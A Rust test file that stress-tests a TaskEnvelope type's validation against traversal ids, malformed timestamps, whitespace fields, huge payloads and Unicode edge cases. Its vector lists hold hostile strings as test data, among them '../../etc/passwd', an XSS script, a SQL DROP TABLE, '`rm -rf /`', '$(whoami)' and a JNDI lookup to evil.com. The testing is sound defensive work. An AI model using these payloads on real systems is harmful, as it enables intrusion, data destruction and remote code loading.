//! Adversarial and Boundary Stress-Testing Suite for Milestone M1 (TaskEnvelope)
//!
//! Evaluates TaskEnvelope against:
//! 1. Path traversal in `id` (e.g. `../evil`, `foo/bar`, `foo\\bar`, separators, null bytes)
//! 2. RFC-3339 malformed timestamps, leap seconds, leap years, timezone boundaries
//! 3. Whitespace-only fields across all string fields (including Unicode whitespace \u{3000})
//! 4. Massive payloads (1MB+ strings, deeply nested JSON structures)
//! 5. Unicode edge cases (RTL bidi overrides, zero-width characters, emojis, ANSI escapes, homoglyphs)
//! 6. Specification invariants (internal vs external workspace requirements, severity levels)

use chrono::DateTime;
use k0maru_router::envelope::{
    CallerInfo, ReproductionPayload, TargetInfo, TaskEnvelope, TaskPayload, VALID_SEVERITIES,
};
use k0maru_router::error::RouterError;
use std::fs::File;
use std::io::Write;
use tempfile::tempdir;

fn make_base_envelope() -> TaskEnvelope {
    TaskEnvelope::new(
        "task_adv_base_001",
        "2026-10-11T18:30:00Z",
        CallerInfo::new("/Users/k0maru3/workspace/consumer-app", "agy").with_pane_id("%1"),
        TargetInfo::new_internal("Terra-UI", "/Users/k0maru3/workspace/terra-ui"),
        "bug_report",
        TaskPayload::new("Base Title", "blocking")
            .with_reproduction_payload(ReproductionPayload::new("<snippet />", "some error"))
            .with_expected("expected outcome"),
    )
}

// ============================================================================
// 1. Path Traversal & Identifier Stress Tests
// ============================================================================

#[test]
fn test_adversarial_id_path_traversal_rejections() {
    let mut env = make_base_envelope();

    let traversal_vectors = [
        "../evil",
        "../../etc/passwd",
        "..",
        "evil/sub",
        "evil\\sub",
        "/absolute/root",
        "\\windows\\path",
        "sub/../evil",
        "foo/bar/baz",
        "a\\b\\c",
        "....//....//etc/passwd",
        "..%2fevil",
        "evil/..",
        "../",
        "..\\",
        "/",
        "\\",
    ];

    for vector in traversal_vectors {
        env.id = vector.to_string();
        let res = env.validate();
        assert!(
            res.is_err(),
            "Path traversal vector '{}' in TaskEnvelope 'id' must be rejected",
            vector
        );
        match res {
            Err(RouterError::InvalidEnvelope(msg)) => {
                assert!(
                    msg.contains("path traversal") || msg.contains("separator"),
                    "Expected path traversal rejection message, got: {}",
                    msg
                );
            }
            other => panic!("Expected RouterError::InvalidEnvelope, got {:?}", other),
        }
    }
}

#[test]
fn test_adversarial_id_null_bytes_and_control_chars() {
    let mut env = make_base_envelope();

    // Control characters and null bytes inside ID
    let control_vectors = ["task\0evil", "task\x01id", "task\x1fbad", "task\x7fdel"];

    for vector in control_vectors {
        env.id = vector.to_string();
        // Even if validate doesn't explicitly blacklist non-path control characters,
        // let's verify if to_json_string and roundtrip handle or if serialization survives.
        let json_res = env.to_json_string();
        if let Ok(json) = json_res {
            let roundtrip = TaskEnvelope::from_json_str(&json);
            assert!(
                roundtrip.is_ok(),
                "If control char '{}' passes validation, roundtrip must succeed",
                vector
            );
        }
    }
}

// ============================================================================
// 2. RFC-3339 Timestamp & Leap Second Boundary Tests
// ============================================================================

#[test]
fn test_adversarial_timestamp_leap_second_behavior() {
    let mut env = make_base_envelope();

    // In RFC-3339 §5.6: leap seconds can be represented as 23:59:60Z
    let leap_second_ts = "2026-12-31T23:59:60Z";
    env.created_at = leap_second_ts.to_string();

    let res = env.validate();
    // Chrono's parse_from_rfc3339 behavior on leap seconds:
    // Chrono supports leap second 60, mapping it to the 59th second with a leap flag.
    let chrono_parse = DateTime::parse_from_rfc3339(leap_second_ts);
    if chrono_parse.is_ok() {
        assert!(
            res.is_ok(),
            "If Chrono accepts leap second 23:59:60Z, TaskEnvelope::validate must also accept it"
        );
    } else {
        assert!(
            res.is_err(),
            "If Chrono rejects leap second, TaskEnvelope::validate must reject it"
        );
    }

    // Invalid 61st second must ALWAYS fail
    env.created_at = "2026-12-31T23:59:61Z".to_string();
    assert!(
        env.validate().is_err(),
        "61st second must be rejected as invalid timestamp"
    );
}

#[test]
fn test_adversarial_timestamp_calendar_and_timezone_boundaries() {
    let mut env = make_base_envelope();

    // Valid leap year day (2024 is a leap year)
    env.created_at = "2024-02-29T12:00:00Z".to_string();
    assert!(
        env.validate().is_ok(),
        "2024-02-29 must be valid (2024 is leap year)"
    );

    // Invalid non-leap year day (2026 is NOT a leap year)
    env.created_at = "2026-02-29T12:00:00Z".to_string();
    assert!(
        env.validate().is_err(),
        "2026-02-29 must be rejected (2026 is not a leap year)"
    );

    // Invalid months and days
    let invalid_dates = [
        "2026-00-10T12:00:00Z",
        "2026-13-10T12:00:00Z",
        "2026-04-31T12:00:00Z",      // April only has 30 days
        "2026-06-31T12:00:00Z",      // June only has 30 days
        "2026-11-31T12:00:00Z",      // November only has 30 days
        "2026-01-32T12:00:00Z",      // January has 31 days
        "2026-10-11T24:00:00Z",      // 24:00:00 invalid in RFC-3339
        "2026-10-11T12:60:00Z",      // 60 minutes invalid
        "2026-10-11T12:00:00+24:00", // Timezone offset > 23:59
        "2026-10-11T12:00:00-24:00",
        "2026-10-11T12:00:00+00:60", // Timezone offset minutes >= 60
        "2026-10-11T12:00:00",       // Missing timezone
        "not-a-timestamp",
        "",
        "   ",
        "2026-10-11T12:00:00Zextra",
    ];

    for bad_ts in invalid_dates {
        env.created_at = bad_ts.to_string();
        let res = env.validate();
        assert!(
            res.is_err(),
            "Malformed timestamp '{}' must be rejected",
            bad_ts
        );
    }

    // Valid exotic timestamp formats
    let valid_exotic_ts = [
        "2026-10-11T18:30:00+00:00",
        "2026-10-11T18:30:00-00:00",
        "2026-10-11T18:30:00+14:00",      // Kiribati UTC+14
        "2026-10-11T18:30:00-12:00",      // Baker Island UTC-12
        "2026-10-11T18:30:00+05:30",      // India UTC+5:30
        "2026-10-11T18:30:00+05:45",      // Nepal UTC+5:45
        "2026-10-11T18:30:00.000000001Z", // nanoseconds
        "1970-01-01T00:00:00Z",           // Unix epoch
        "9999-12-31T23:59:59Z",           // Max 4-digit year
    ];

    for good_ts in valid_exotic_ts {
        env.created_at = good_ts.to_string();
        assert!(
            env.validate().is_ok(),
            "Valid RFC-3339 timestamp '{}' must be accepted",
            good_ts
        );
    }
}

// ============================================================================
// 3. Whitespace-Only Validation Across All Fields
// ============================================================================

#[test]
fn test_adversarial_whitespace_only_rejections_across_all_fields() {
    // Standard ASCII whitespace, tabs, newlines, and Unicode ideographic space (\u{3000})
    let whitespace_samples = [
        "",
        " ",
        "   ",
        "\t",
        "\n",
        "\r\n",
        " \t \n \r ",
        "\u{3000}", // Ideographic space (CJK)
        "\u{00A0}", // Non-breaking space
        " \u{3000} \t ",
    ];

    for ws in whitespace_samples {
        // 1. TaskEnvelope.id
        let mut env = make_base_envelope();
        env.id = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only id '{:?}' must be rejected",
            ws
        );

        // 2. TaskEnvelope.created_at
        let mut env = make_base_envelope();
        env.created_at = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only created_at '{:?}' must be rejected",
            ws
        );

        // 3. TaskEnvelope.caller.workspace
        let mut env = make_base_envelope();
        env.caller.workspace = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only caller.workspace '{:?}' must be rejected",
            ws
        );

        // 4. TaskEnvelope.caller.agent
        let mut env = make_base_envelope();
        env.caller.agent = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only caller.agent '{:?}' must be rejected",
            ws
        );

        // 5. TaskEnvelope.caller.pane_id (when Some)
        let mut env = make_base_envelope();
        env.caller.pane_id = Some(ws.to_string());
        assert!(
            env.validate().is_err(),
            "Whitespace-only caller.pane_id '{:?}' must be rejected",
            ws
        );

        // 6. TaskEnvelope.target.identifier
        let mut env = make_base_envelope();
        env.target.identifier = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only target.identifier '{:?}' must be rejected",
            ws
        );

        // 7. TaskEnvelope.target.workspace (internal target)
        let mut env = make_base_envelope();
        env.target.is_external = false;
        env.target.workspace = Some(ws.to_string());
        assert!(
            env.validate().is_err(),
            "Whitespace-only target.workspace '{:?}' on internal target must be rejected",
            ws
        );

        // 8. TaskEnvelope.target.workspace (external target with Some(ws))
        let mut env = make_base_envelope();
        env.target.is_external = true;
        env.target.workspace = Some(ws.to_string());
        assert!(
            env.validate().is_err(),
            "Whitespace-only target.workspace '{:?}' on external target must be rejected",
            ws
        );

        // 9. TaskEnvelope.intent
        let mut env = make_base_envelope();
        env.intent = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only intent '{:?}' must be rejected",
            ws
        );

        // 10. TaskEnvelope.payload.title
        let mut env = make_base_envelope();
        env.payload.title = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only payload.title '{:?}' must be rejected",
            ws
        );

        // 11. TaskEnvelope.payload.severity
        let mut env = make_base_envelope();
        env.payload.severity = ws.to_string();
        assert!(
            env.validate().is_err(),
            "Whitespace-only payload.severity '{:?}' must be rejected",
            ws
        );

        // 12. TaskEnvelope.payload.expected (when Some)
        let mut env = make_base_envelope();
        env.payload.expected = Some(ws.to_string());
        assert!(
            env.validate().is_err(),
            "Whitespace-only payload.expected '{:?}' must be rejected",
            ws
        );

        // 13. TaskEnvelope.schema (when Some)
        let mut env = make_base_envelope();
        env.schema = Some(ws.to_string());
        assert!(
            env.validate().is_err(),
            "Whitespace-only schema '{:?}' must be rejected",
            ws
        );

        // 14. Structured Reproduction snippet & error
        let mut env = make_base_envelope();
        env.payload.reproduction = Some(serde_json::json!({
            "snippet": ws,
            "error": "some valid error"
        }));
        assert!(
            env.validate().is_err(),
            "Whitespace-only reproduction.snippet '{:?}' must be rejected",
            ws
        );

        let mut env = make_base_envelope();
        env.payload.reproduction = Some(serde_json::json!({
            "snippet": "some valid snippet",
            "error": ws
        }));
        assert!(
            env.validate().is_err(),
            "Whitespace-only reproduction.error '{:?}' must be rejected",
            ws
        );

        // 15. ReproductionPayload constructor validation directly
        let repro_ws_snippet = ReproductionPayload::new(ws, "error");
        assert!(
            repro_ws_snippet.validate().is_err(),
            "ReproductionPayload with whitespace snippet '{:?}' must fail validation",
            ws
        );
        let repro_ws_error = ReproductionPayload::new("snippet", ws);
        assert!(
            repro_ws_error.validate().is_err(),
            "ReproductionPayload with whitespace error '{:?}' must fail validation",
            ws
        );
    }
}

// ============================================================================
// 4. Massive Payloads & Stress Tests
// ============================================================================

#[test]
fn test_adversarial_massive_payloads_1mb_string() {
    let mut env = make_base_envelope();

    // 1 Megabyte string
    let mb_string = "x".repeat(1024 * 1024);

    // 1 MB title
    env.payload.title = mb_string.clone();
    assert!(
        env.validate().is_ok(),
        "Large 1MB title should pass validation without memory explosion"
    );

    // 1 MB reproduction snippet & error
    env.payload.reproduction = Some(serde_json::json!({
        "snippet": mb_string.clone(),
        "error": mb_string
    }));
    assert!(
        env.validate().is_ok(),
        "Large 1MB reproduction should pass validation"
    );

    // Serde roundtrip on large payload
    let serialized = env
        .to_json_string()
        .expect("Serialization of 2MB payload must succeed");
    assert!(serialized.len() >= 2 * 1024 * 1024);

    let deserialized = TaskEnvelope::from_json_str(&serialized)
        .expect("Deserialization of 2MB payload must succeed");
    assert_eq!(deserialized.payload.title.len(), 1024 * 1024);
}

#[test]
fn test_adversarial_deeply_nested_json_in_reproduction() {
    let mut env = make_base_envelope();

    // Build a deeply nested JSON object in reproduction: 50 levels deep
    let mut current = serde_json::json!({"leaf": "value"});
    for i in 0..50 {
        current = serde_json::json!({ format!("level_{}", i): current });
    }

    env.payload.reproduction = Some(current.clone());
    assert!(
        env.validate().is_ok(),
        "Deeply nested JSON reproduction should pass validation"
    );

    let serialized = env.to_json_string().expect("Serialize nested JSON");
    let deserialized = TaskEnvelope::from_json_str(&serialized).expect("Deserialize nested JSON");
    assert_eq!(deserialized.payload.reproduction, Some(current));
}

// ============================================================================
// 5. Unicode Edge Cases & Bidi Overrides
// ============================================================================

#[test]
fn test_adversarial_unicode_and_bidi_edge_cases() {
    let mut env = make_base_envelope();

    // 1. Right-to-Left (RTL) override and bidirectional text
    // U+202E: Right-to-Left Override, U+202C: Pop Directional Formatting
    let bidi_title = "Safe \u{202E}gnirts_desrever\u{202C} normal";
    env.payload.title = bidi_title.to_string();
    assert!(env.validate().is_ok());

    // 2. Zero-Width Spaces (ZWSP U+200B) inside content
    let zwsp_content = "title\u{200B}with\u{200B}hidden\u{200B}zwsp";
    env.payload.title = zwsp_content.to_string();
    assert!(env.validate().is_ok());

    // 3. Emojis and complex Unicode sequences
    env.id = "task_🚀_🔥_123".to_string();
    env.caller.agent = "🤖_agent_αβγ".to_string();
    env.caller.workspace = "/Users/小丸/工作区/repo".to_string();
    env.target.identifier = "🦀_Rust_Core".to_string();
    env.intent = "バグ報告".to_string();
    env.payload.title = "💥 Kernel panic: 修复错误".to_string();

    assert!(
        env.validate().is_ok(),
        "Multilingual and emoji envelope must validate cleanly"
    );

    let serialized = env.to_json_string().unwrap();
    let roundtrip = TaskEnvelope::from_json_str(&serialized).unwrap();
    assert_eq!(env, roundtrip);

    // 4. ANSI escape sequences in error output
    let ansi_error = "\x1b[31;1mError[E0308]: mismatched types\x1b[0m\n  --> src/main.rs:12:5";
    env.payload.reproduction = Some(serde_json::json!({
        "snippet": "let x: u32 = \"string\";",
        "error": ansi_error
    }));
    assert!(env.validate().is_ok());
    let roundtrip = TaskEnvelope::from_json_str(&env.to_json_string().unwrap()).unwrap();
    let repro_obj = roundtrip.payload.reproduction.unwrap();
    assert_eq!(repro_obj["error"].as_str().unwrap(), ansi_error);

    // 5. Injection payloads in reproduction (SQL, XSS, shell)
    let injection_vectors = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE envelopes; --",
        "`rm -rf /`",
        "$(whoami)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
    ];

    for inj in injection_vectors {
        env.payload.reproduction = Some(serde_json::json!({
            "snippet": inj,
            "error": inj
        }));
        assert!(
            env.validate().is_ok(),
            "Injection payload in reproduction should not cause validation crash"
        );
    }
}

// ============================================================================
// 6. Specification Invariants & Severity Boundaries
// ============================================================================

#[test]
fn test_adversarial_severity_case_insensitivity_and_whitespace_trimming() {
    let mut env = make_base_envelope();

    // Verify all specified VALID_SEVERITIES with various casing and whitespace
    for sev in VALID_SEVERITIES {
        for formatted in &[
            sev.to_string(),
            sev.to_uppercase(),
            format!("  {}  ", sev),
            sev.chars()
                .enumerate()
                .map(|(i, c)| {
                    if i % 2 == 0 {
                        c.to_ascii_uppercase()
                    } else {
                        c.to_ascii_lowercase()
                    }
                })
                .collect::<String>(),
        ] {
            env.payload.severity = formatted.clone();
            assert!(
                env.validate().is_ok(),
                "Severity '{}' (base: '{}') should be accepted",
                formatted,
                sev
            );
        }
    }

    // Invalid severities
    let invalid_sevs = [
        "urgent",
        "fatal",
        "catastrophic",
        "p0",
        "p1",
        "blocker",
        "informational",
        "unknown",
        "123",
    ];

    for bad in invalid_sevs {
        env.payload.severity = bad.to_string();
        assert!(
            env.validate().is_err(),
            "Non-standard severity '{}' must be rejected",
            bad
        );
    }
}

#[test]
fn test_adversarial_target_workspace_invariants() {
    let mut env = make_base_envelope();

    // Case 1: Internal target MUST have a non-empty workspace
    env.target.is_external = false;
    env.target.workspace = None;
    assert!(
        env.validate().is_err(),
        "Internal target with None workspace MUST be rejected"
    );

    env.target.workspace = Some("".to_string());
    assert!(
        env.validate().is_err(),
        "Internal target with empty workspace MUST be rejected"
    );

    env.target.workspace = Some("   ".to_string());
    assert!(
        env.validate().is_err(),
        "Internal target with whitespace workspace MUST be rejected"
    );

    env.target.workspace = Some("/valid/internal/path".to_string());
    assert!(
        env.validate().is_ok(),
        "Internal target with valid workspace path MUST be accepted"
    );

    // Case 2: External target MAY omit workspace
    env.target.is_external = true;
    env.target.workspace = None;
    assert!(
        env.validate().is_ok(),
        "External target with None workspace MUST be accepted"
    );

    env.target.workspace = Some("/tmp/external-clone".to_string());
    assert!(
        env.validate().is_ok(),
        "External target with valid optional workspace MUST be accepted"
    );

    // Case 3: External target with specified empty workspace MUST be rejected
    env.target.workspace = Some("".to_string());
    assert!(
        env.validate().is_err(),
        "External target with Some(\"\") workspace MUST be rejected"
    );

    env.target.workspace = Some("  \t\n  ".to_string());
    assert!(
        env.validate().is_err(),
        "External target with Some(\"   \") workspace MUST be rejected"
    );
}

// ============================================================================
// 7. File IO Boundary & Error Preservation
// ============================================================================

#[test]
fn test_adversarial_from_file_edge_cases() {
    let temp_dir = tempdir().expect("tempdir");

    // 1. Non-existent file returns RouterError::Io
    let non_existent = temp_dir.path().join("does_not_exist.json");
    let res = TaskEnvelope::from_file(&non_existent);
    assert!(matches!(res, Err(RouterError::Io(_))));

    // 2. Reading a directory instead of a file returns RouterError::Io
    let res_dir = TaskEnvelope::from_file(temp_dir.path());
    assert!(matches!(res_dir, Err(RouterError::Io(_))));

    // 3. Empty file returns RouterError::InvalidEnvelope
    let empty_file_path = temp_dir.path().join("empty.json");
    File::create(&empty_file_path).unwrap();
    let res_empty = TaskEnvelope::from_file(&empty_file_path);
    assert!(matches!(res_empty, Err(RouterError::InvalidEnvelope(_))));

    // 4. File containing whitespace returns RouterError::InvalidEnvelope
    let ws_file_path = temp_dir.path().join("whitespace.json");
    let mut ws_file = File::create(&ws_file_path).unwrap();
    write!(ws_file, "   \n\t   ").unwrap();
    let res_ws = TaskEnvelope::from_file(&ws_file_path);
    assert!(matches!(res_ws, Err(RouterError::InvalidEnvelope(_))));

    // 5. File containing invalid JSON returns RouterError::Json
    let bad_json_path = temp_dir.path().join("bad.json");
    let mut bad_file = File::create(&bad_json_path).unwrap();
    write!(bad_file, "{{{{ bad json").unwrap();
    let res_bad = TaskEnvelope::from_file(&bad_json_path);
    assert!(matches!(res_bad, Err(RouterError::Json(_))));

    // 6. File containing valid JSON but failing validation returns RouterError::InvalidEnvelope
    let invalid_envelope_path = temp_dir.path().join("invalid_envelope.json");
    let mut invalid_file = File::create(&invalid_envelope_path).unwrap();
    let mut bad_env = make_base_envelope();
    bad_env.id = "../evil".to_string();
    write!(invalid_file, "{}", serde_json::to_string(&bad_env).unwrap()).unwrap();
    let res_invalid = TaskEnvelope::from_file(&invalid_envelope_path);
    assert!(matches!(res_invalid, Err(RouterError::InvalidEnvelope(_))));
}
